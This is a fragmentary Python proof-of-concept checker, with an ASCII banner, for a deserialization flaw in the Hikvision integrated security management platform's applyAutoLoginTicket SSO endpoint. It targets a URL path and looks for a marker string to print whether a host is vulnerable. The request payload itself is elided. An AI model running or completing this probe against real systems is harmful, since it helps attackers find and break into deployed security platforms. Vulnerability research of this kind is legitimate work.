              ...
              "8aa8"      88           88,d88'      88 88  `8b   88 88             
               `88'       88           8888"88,     88 88   `8b  88 88      88888  
                ...
                88        88           88     "88,  88 88     `888   `"Y88888P"   
                            ...
                            tag: this is a  海康威视-综合安防管理平台 applyautologinticket 反序列化 poc                                       
...
def poc(target):
    if target[-1] == '/':
        ...
        target = target + "/"
    url = target + "bic/ssoService/v1/applyAutoLoginTicket"
    ...
    try:
        ...
        randstr = r"y1k1ng"
        if randstr in response.text and "unknow error" in response.text and response.status_code == 200:
            print(f"[+] {target} 存在 反序列化漏洞 ")
        else:
            print(f"[-] {target} 未发现 反序列化漏洞")
